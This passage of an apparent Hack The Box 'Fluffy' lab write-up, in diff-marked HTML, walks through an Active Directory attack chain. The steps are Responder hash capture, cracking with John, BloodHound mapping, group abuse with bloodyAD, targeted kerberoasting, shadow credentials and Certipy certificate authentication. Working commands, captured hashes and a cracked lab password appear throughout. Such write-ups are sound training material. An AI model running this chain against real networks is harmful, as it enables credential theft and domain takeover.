+</span></span><span style="display:flex;"><span>    Force WPAD auth            <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Force Basic Auth           <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Force LM downgrade         <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Force ESS downgrade        <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Generic Options:
+</span></span><span style="display:flex;"><span>    Responder NIC              <span style="color:#f92672">[</span>tun0<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Responder IP               <span style="color:#f92672">[</span>10.10.16.75<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Responder IPv6             <span style="color:#f92672">[</span>dead:beef:4::1049<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Challenge set              <span style="color:#f92672">[</span>random<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Don<span style="color:#e6db74">&#39;t Respond To Names     [&#39;</span>ISATAP<span style="color:#e6db74">&#39;, &#39;</span>ISATAP.LOCAL<span style="color:#e6db74">&#39;]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Don&#39;</span>t Respond To MDNS TLD  <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;_DOSVC&#39;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    TTL <span style="color:#66d9ef">for</span> poisoned response  <span style="color:#f92672">[</span>default<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Current Session Variables:
+</span></span><span style="display:flex;"><span>    Responder Machine Name     <span style="color:#f92672">[</span>WIN-DU8IDYUEGAF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Responder Domain Name      <span style="color:#f92672">[</span>3CGF.LOCAL<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Responder DCE-RPC Port     <span style="color:#f92672">[</span>48866<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Listening <span style="color:#66d9ef">for</span> events...                                                                                                                     
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Client   : 10.10.11.69
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Username : FLUFFY<span style="color:#ae81ff">\p</span>.agila
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Hash     : p.agila::FLUFFY:94a991ee1dadb617:7CC7520C05900F433F9FAB0C71959703:0101000000000000809AE9316CD0DB012ECCE7CE4B886DE00000000002000800330043004700460001001E00570049004E002D004400550038004900440059005500450047004100460004003400570049004E002D00440055003800490044005900550045004700410046002E0033004300470046002E004C004F00430041004C000300140033004300470046002E004C004F00430041004C000500140033004300470046002E004C004F00430041004C0007000800809AE9316CD0DB0106000400020000000800300030000000000000000100000000200000313F0E1DD62774CA1E8F9DDBBB7990F703EA1C141D16C2B7DDFFE296E0CF07720A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00370035000000000000000000                                                                                                                                              
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Client   : 10.10.11.69
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Username : FLUFFY<span style="color:#ae81ff">\p</span>.agila
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Hash     : p.agila::FLUFFY:6109f53b6d82f7d7:AF4211657658A3B8F79DFDAC295C9728:0101000000000000809AE9316CD0DB01398EE1FFCFE429340000000002000800330043004700460001001E00570049004E002D004400550038004900440059005500450047004100460004003400570049004E002D00440055003800490044005900550045004700410046002E0033004300470046002E004C004F00430041004C000300140033004300470046002E004C004F00430041004C000500140033004300470046002E004C004F00430041004C0007000800809AE9316CD0DB0106000400020000000800300030000000000000000100000000200000313F0E1DD62774CA1E8F9DDBBB7990F703EA1C141D16C2B7DDFFE296E0CF07720A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00370035000000000000000000
+</span></span></code></pre></div><p>We will use <code>John</code> here to crack the hash we got</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>root@kali<span style="color:#f92672">]</span> /home/kali/Fluffy  
+</span></span><span style="display:flex;"><span>❯ john hash.txt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>netntlmv2, NTLMv2 C/R <span style="color:#f92672">[</span>MD4 HMAC-MD5 32/64<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">8</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>prometheusx-303 <span style="color:#f92672">(</span>p.agila<span style="color:#f92672">)</span>     
+</span></span></code></pre></div><p>PASSWORD: <strong>prometheusx-303</strong></p>
+<p>Cool, now we can further enumerate the domain through our new found credentials.
+Its always good to re-run bloodhound once you pwn new users, as higher privileged users can map more of the domain than low privileged in some cases.</p>
+<p>Note that the <code>Faketime</code> command i use before most of my commands later on is to sync our clock time with the domain controller&hellip;</p>
+<p>You can check the DC&rsquo;s time by doing the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ntpdate -q dc01.fluffy.htb
+</span></span></code></pre></div>
+<h2 class="relative group">Bloodhound 
+    <div id="bloodhound" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#bloodhound" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>faketime <span style="color:#e6db74">&#39;2025-09-17 03:30:34&#39;</span> bloodhound-ce-python -u <span style="color:#e6db74">&#39;p.agila&#39;</span> -p <span style="color:#e6db74">&#39;prometheusx-303&#39;</span> -d fluffy.htb -ns 10.10.11.69 -c All --zip
+</span></span><span style="display:flex;"><span>INFO: BloodHound.py <span style="color:#66d9ef">for</span> BloodHound Community Edition
+</span></span><span style="display:flex;"><span>INFO: Found AD domain: fluffy.htb
+</span></span><span style="display:flex;"><span>INFO: Getting TGT <span style="color:#66d9ef">for</span> user
+</span></span><span style="display:flex;"><span>INFO: Connecting to LDAP server: dc01.fluffy.htb
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> domains
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> domains in the forest
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> computers
+</span></span><span style="display:flex;"><span>INFO: Connecting to LDAP server: dc01.fluffy.htb
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">10</span> users
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">54</span> groups
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">2</span> gpos
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> ous
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">19</span> containers
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">0</span> trusts
+</span></span><span style="display:flex;"><span>INFO: Starting computer enumeration with <span style="color:#ae81ff">10</span> workers
+</span></span><span style="display:flex;"><span>INFO: Querying computer: DC01.fluffy.htb
+</span></span><span style="display:flex;"><span>INFO: Done in 00M 04S
+</span></span><span style="display:flex;"><span>INFO: Compressing output into 20250917033035_bloodhound.zip
+</span></span></code></pre></div><p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="bloodhound-agila1" src="/img/writeups/htb-fluffy/bloodhound-agila1.png">
+
+  
+</figure>
+
+
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="bloodhound-agila2" src="/img/writeups/htb-fluffy/bloodhound-agila2.png">
+
+  
+</figure>
+</p>
+<p>Here we can see our owned user, <strong>p.agila</strong>.</p>
+<p>Bloodhound tells us 2 things to note:</p>
+<ul>
+<li>our user is part of a group called <strong>SERVICE ACCOUNT MANAGERS</strong> that has <em>GenericAll</em> over the <strong>SERVICE ACCOUNTS</strong> group.</li>
+<li>the <strong>SERVICE ACCOUNTS</strong> group contains 3 users, all service accounts.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bloodyAD --host <span style="color:#e6db74">&#39;10.10.11.69&#39;</span> -d <span style="color:#e6db74">&#39;dc01.fluffy.htb&#39;</span> -u <span style="color:#e6db74">&#39;p.agila&#39;</span> -p <span style="color:#e6db74">&#39;prometheusx-303&#39;</span>  add groupMember <span style="color:#e6db74">&#39;SERVICE ACCOUNTS&#39;</span> p.agila
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> p.agila added to SERVICE ACCOUNTS
+</span></span></code></pre></div><p>Lets try a targeted kerberoast attack and see if we can pull any krb5tgs hashes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>faketime <span style="color:#e6db74">&#39;2025-09-17 16:50:01&#39;</span> python3 /home/kali/htb/voleur/targetedKerberoast/targetedKerberoast.py --dc-ip 10.10.11.69 -d fluffy.htb -u p.agila -p <span style="color:#e6db74">&#39;prometheusx-303&#39;</span>       
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting kerberoast attacks
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Fetching usernames from Active Directory with LDAP
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Printing hash <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>ca_svc<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$42c24ce05c061a0d8a228a88dc8658ab$89a7e1c4fd334f2221c0ab432b7a022c1346202370343a4f44e57fb701d9d5de16a936a584b47e7d1094b574913f334867a1ab97cb1fadc9e1f963b6f9c8ba4c80edc5a37c5d5dfb321fc74f6ca89291bc96978d5dcbb011dec37bba060ec6465c90fdb49fbaebbc5b4013af094b99cbf4bc6f47905cae6f663fd4ce882802266860d4c87eecb4b855b14b690448f4b031733dae835be4d8ef7ab4ab98d0ffdb19697589c8dca094a5b4399aad388aa06c434ef96530f15a7ab265e1ff30ff4c295e571663b6e647fb7a58dd17fbb69b12e2405c14973aa91fbfc3e3b94822addce048889062953b789e9c84209fc9de47cbeb6d9f5abd264ecc509e932bc90cfa53356cea5974f69fe005e13b563a6387de61a4ef1cd9541e77443d8986b9854aac1de681491558bd4a24f081b89cef406a39e6f1f5f2a4c7a44a752d7a06ea04fb1fd4b30314844e580e3978ff5e53a9eea58095c5f9a3545b64c27ed1bd52ae82fcdd148db3f4eab07ac304fa01682ec0af5478620d068a0e8e7ba01b4f390217b417e952caccf77dc788404221e195b08a158180232dfb51a8126dc4ef0b9495399895935d7e1c01718c16868a2d168c61b2afb918d811ff354c5890fe4ed2b997a3d478b5b713fd5fd82d77f925f5a47d74d68b8f08e811fabe30d70884d31c43a0084d761f2f8767f332aa12240e85f338ebaf65984be582f1bf81ea32493970aea1204e15ad0116fa1486f004b0b40eb4310ac8f521df01aa95a27780b67692a790fdd997950f92069656c21aac51f47ec57474dc8220f78a6844e34e4dd7620a50811eb1556481ea0fa106d5ec299245850e1d6bc4b9612074021fd9a0eb0e7a1b99c2f63675660aa7108329b49ab56c129337ad5c8cad16663a4c88bef12f208156bbf8671c2b7410aa0c79f8be8cb67e41695810b6a33a56976ca2fc30b97f19a7b9bb1ee280384c88447039f7855297d604351f599e36b4427deab499788a71d4eeb4207183f9106926f3fe8e7cebd28bbb11f9ab4a2b8d42fc5ba470699ecf46dbd5ee21c8939090cc7996088fd12f9f5a30e3fea280acf1c4ad1ae348a975f42825cfbbf5a2d149f948cfc6ee74237d84d430a9394ca008299eed2692df5e5d7bf1e6e1e3dc619fb6e12c061d9e3ab19c286ea443fd4fc127c4d74c41d9ba2fdb2d3a8e77601b1d16b84ec4270722bebe79add0f16d9887127e6c7069f13f8b69401c0816608288c2c0ad2af895b9520a08903ba391e8d4a0c12f45c69a880be58d97406eed1fa99e896e69b41f127d7c210927a7335f7cca75f3834c94ff6f15078a5ea78a5b98ed9c6dcc7a235946e92e129981c567ac17f9af615b5f1e959c3cd11579cca7fd8086c9a19c6f3218d2f6b29ff3f4dfe81e202f609400daa8068a60da14572021cd5a6636792c9a639bb5e34df56146a377b948874a637b72cd4414131ee8f6e18915d858fd7706f6a3f471624209c368a90a8aaf
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Printing hash <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>ldap_svc<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$krb5tgs$23$*ldap_svc$FLUFFY.HTB$fluffy.htb/ldap_svc*$0d1bb19e7077e7f4d43eacc507576b0f$c883be55bb91f6314a27211e011fccb21bad2695706a368a411d863de0570c3f38a4771f41b777687a40b6e2c40893ec57e5cc7bcc0c71747d431cf2833da5b04fdf0ab35cf5674562b6b5bb7c7a8a00ed81cad2ee1effa71f3100eb8d5d3f491fe23775157569d98b8ccc9e639cfcd744cea95d7dbb45bae1493a57d690890ff88b3c7e9a5efc58452bd6117f1a9a6ef85ff17e7caf01519eb7a8afec306bfbbb79fb050c21202bb06bc2bf380acc847bb7f3496161237e2c9b68915cec66ebe231079f6df29eaa506f75ea36197fd45c4f1071de213f6b79478e0c70ca658569beb7d71f5705c8a379079bab8c6cdede508fc23f4688fdf4c8bd1bfb86bcd81bc4277055c84ea75fe964bd1f9d3e345dd325c382db790d93290742834e98d5a3f901a11313ae2a4869c83b4cee9db6eac64ee401f6fbe74fe3b3aa2774fac662556e0363c99f9bc9cdd4028372c81777d3a321a8942670d93d557645bb777263d7ce504f3cdf6ee81d70160f0abb53e46112fc0632da5a3ea41181052f0bebb70fe0bdc815d0576623da5773b18af40435e7101f2d3bc9c753251233c7c5ceca39f9e4bbc5f3133d51df762b850a7be8e71b2793e73d8458ac3d1cb90cc0a809d6ce375b3ce70a06b352dd3fef944e0d519c82855f6d4abc5c7e5e50bbd23e24e6cc4350dd3f6fc00849a9f227104cf6f64d2dc4bf55ffe72f902fac3b2679cc19cec72bf789c840910da9318b71f6116caeb4f96b97ca1b776e81f4920815557a9d653c6675d07bb37b8ec8b6802aaaaa1dc70d652c20fbe5fc8ad5388433c31c031a2b3211935e615cd0c3ec7345781f9b49a208292ee9fd3dd01673de7e4a43f1a69cfc190fb666c0d4c081bea7458aaf2ad162f5470b29f7acb5281ffaa8b68f520b4f61b03f13b7eb7f94c00734e1d0dd564af3ff627aaf69678f766c2add4c79cf3b340fa9f5780a5d08203788de987c3f9ae5d177f5487af23b87bab5c70631f4ae65bc8dea3688707bfbf10559c3199f04641817eeaab00f28a9a171b3cf9a6252d0dacd07cefa058facda46b580c66b5e4db83d3ddec0f20fe4289cd6aed3abc5e667cf36527432ae60fc61bbd916657d97a8964c6b708b67e69a31b2c2b5407e5c63bb3fd258d9ff0dfec359de055c1f50aed615e2a90d440600fa26e0df7dd837f2cbf63b1090997b75d102ff5160377dc6db5df959975c93a95ef285141ca2299d9d4f06b916411c40e7af64ec52cc0bd2648fbe4c1598878fc2613661d0fb0f6bf07abea6f5b21bff3c872f71f24b59a8c7b0d4ede43258c24a8a8bc46fd27d99900e3f72fafc2b5483892a6838320250e475c007295782ecd77cb2851ae22e69c0775009d02b5b508f86139a341a0df6760e35c77e5cd213447636c659547d76302117dc243ca12607338d32f9391f1536077dd7ce3da09854424bc2e34e31aad4d700c0455cb8ef03e80396a9ce820bb77cdb9d6b3bc838ec86
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Printing hash <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>winrm_svc<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb/winrm_svc*$02572feda034f31ebda665d6466a8bd5$3216d595c1ff5e72665f7839217fe29e1cf80cfae87c5fe2f94355752d06c417366c49037e1c23524630e97126abb3cca1b244a75a869e6702875fbcb9f2ed8a8b8350faf80fb2fa9db6de194dfc430b522428741cceda32e3d05b8fb957a7fc048746a88104080a37cfc36b0569a7549af0adb10575cf0efef91120670973c0344958a3c15cdf29c14e46f420c95fb058658e12371854ce7b52a9c92d8a8053914ebfaedad9bb20fe2c2a54372b392da362e92b32feef045ff348f4872928c5ca9edd7d094f1120fcab1a0ade9e95e18dcdc88ae90e504883aee1bc70ecdb81dd52de15b718be609908afed852faa675652bcb6f4ba8dfdce20f20376138cfe6b730b6efe644ee90d891d5f637b27e20ba6bf4358bd165148fe81b6a9a5c2c65b66ad2c36da4e751236953b302950df977a8902fcf08dfa141cc589316ab63e9a83be4106a4a7b35ee638a88da7a590f36ccb8af83dd4ae10297188cdfc517c090f6f62b8b42a6a3acd8db6e5190e38955bf07d5f18315e66cbe7812928d6e345bf24eb16d861d26c150aa64aee3f91f480bf5ad77e6a8aa086bf78431e101f8e20fbf005a7d5cc2e01a580a42895538665eb7d65c1a38260be3196480fcb8e42fda2c204357d17dd76ab43486f754d52b1cb2cfbafbe41e1e833049496729735f987f08ecef20742151453b7ac311e6349a3ab75c79ddac241d8bce5f8bcd4b897214736b8cd5a7e8397ddc7e26b337a90e36805ec8f5c9601689bac4d15cb0ada49d0974967149b5ca09c77246f31e2f1cbf6b67698c0255b5dc85a59a709a6b4d7ec3b3217008fbac9c8e837477ce7d2bae18dd3e238e2243d405118db055705f05ae6674e35289f99b9098ef30661725e349f6968b78b4250b2d653935941ec5b3fc6a5e9bf3a654a3076bc0ce2c6cb18f9b193a48cc9877ffb8195369c3dda327d98919e5fc88cc59061ecd649d889d3cb9c8958753dfb88d448d27b8edb36e39639503b9f541552c49aea0175a86a2bca4d8661040f32994d8d42b0398e89a90faa18f382671697513b11fe788ce7fe24eb4ebcbf4af3ff53c509b75c3c29bdf4864802ab668c9f7141737a3dc0a53a02af53d6c0370bf29ee332aa1be48eb3c555dd9d707c0d2f2785d4e91394c8c30a0f42bccb5e213054632f384fa71df1b2232476b60e567283305d9548f83545164a77f7af1544594f9f173da4f35d3f5ccd9498441987c7f795f648e65eeeed3385237e563ec24c407af4f9e8689af3a9db58e0b4eadd42702f391cf9d5184965f294d3af645f529250cc59de5415c713484da49078e87101f14149c34241067dca102b0a812b7681082ae219ef0473125c882b8a016c13e5d99557d396985c7e693863e74d8c1157154294013e3f63fd337c6c932381900ba6058643fb3e6c9200e96c898fdaef5d84295a4451b161f55c69e781d1dc2e9d97b56ae18476f025eb61b60dee622a81e160d82f17a9
+</span></span></code></pre></div>
+<h2 class="relative group">Shadow Credentials 
+    <div id="shadow-credentials" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#shadow-credentials" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 /home/kali/htb/certified/pywhisker/pywhisker/pywhisker.py -d <span style="color:#e6db74">&#34;fluffy.htb&#34;</span> -u <span style="color:#e6db74">&#34;p.agila&#34;</span> -p <span style="color:#e6db74">&#34;prometheusx-303&#34;</span> --target <span style="color:#e6db74">&#34;winrm_svc&#34;</span> --action <span style="color:#e6db74">&#34;add&#34;</span>   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Searching <span style="color:#66d9ef">for</span> the target account
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target user found: CN<span style="color:#f92672">=</span>winrm service,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>fluffy,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Generating certificate
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate generated
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Generating KeyCredential
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> KeyCredential generated with DeviceID: 
+</span></span><span style="display:flex;"><span>8610c333-2b13-d4cb-81f5-55e343d0a583
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Updating the msDS-KeyCredentialLink attribute of winrm_svc
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Updated the msDS-KeyCredentialLink attribute of the target object
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Converting PEM -&gt; PFX with cryptography: CyOWFEbX.pfx
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PFX exportiert nach: CyOWFEbX.pfx
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Passwort für PFX: ThyKxKWLzAyuaDKzyiLm
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Saved PFX <span style="color:#f92672">(</span><span style="color:#75715e">#PKCS12) certificate &amp; key at path: CyOWFEbX.pfx</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Must be used with password: ThyKxKWLzAyuaDKzyiLm
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+</span></span></code></pre></div><p>Before we can auth with <code>Certipy</code>, we need to ensure we take the password off the .pfx file we just got.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad cert -export -pfx CyOWFEbX.pfx -password ThyKxKWLzAyuaDKzyiLm -out unprotected.pfx
+</span></span><span style="display:flex;"><span>Certipy v5.0.3 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Data written to <span style="color:#e6db74">&#39;unprotected.pfx&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>faketime <span style="color:#e6db74">&#39;2025-09-17 17:27:54&#39;</span> certipy-ad auth -pfx <span style="color:#e6db74">&#34;unprotected.pfx&#34;</span> -dc-ip <span style="color:#e6db74">&#39;10.10.11.69&#39;</span> -username <span style="color:#e6db74">&#39;winrm_svc&#39;</span> -domain <span style="color:#e6db74">&#39;fluffy.htb&#39;</span>
+</span></span><span style="display:flex;"><span>Certipy v5.0.3 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate identities:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     No identities found in this certificate
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Could not find identity in the provided certificate
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using principal: <span style="color:#e6db74">&#39;winrm_svc@fluffy.htb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to get TGT...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got TGT
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving credential cache to <span style="color:#e6db74">&#39;winrm_svc.ccache&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Wrote credential cache to <span style="color:#e6db74">&#39;winrm_svc.ccache&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to retrieve NT hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;winrm_svc&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;winrm_svc@fluffy.htb&#39;</span>: REDACTED
+</span></span></code></pre></div><p>Do the same for the CA_SVC account while we&rsquo;re at it</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>faketime <span style="color:#e6db74">&#39;2025-09-17 17:42:08&#39;</span> certipy-ad auth -pfx ca.pfx -dc-ip 10.10.11.69 -username <span style="color:#e6db74">&#39;ca_svc&#39;</span> -domain <span style="color:#e6db74">&#39;fluffy.htb&#39;</span> 
+</span></span><span style="display:flex;"><span>Certipy v5.0.3 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate identities:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     No identities found in this certificate
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Could not find identity in the provided certificate
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using principal: <span style="color:#e6db74">&#39;ca_svc@fluffy.htb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to get TGT...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got TGT
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving credential cache to <span style="color:#e6db74">&#39;ca_svc.ccache&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Wrote credential cache to <span style="color:#e6db74">&#39;ca_svc.ccache&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to retrieve NT hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;ca_svc&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;ca_svc@fluffy.htb&#39;</span>: REDACTED
+</span></span></code></pre></div>
+<h2 class="relative group">user.txt 
+    <div id="usertxt" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#usertxt" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
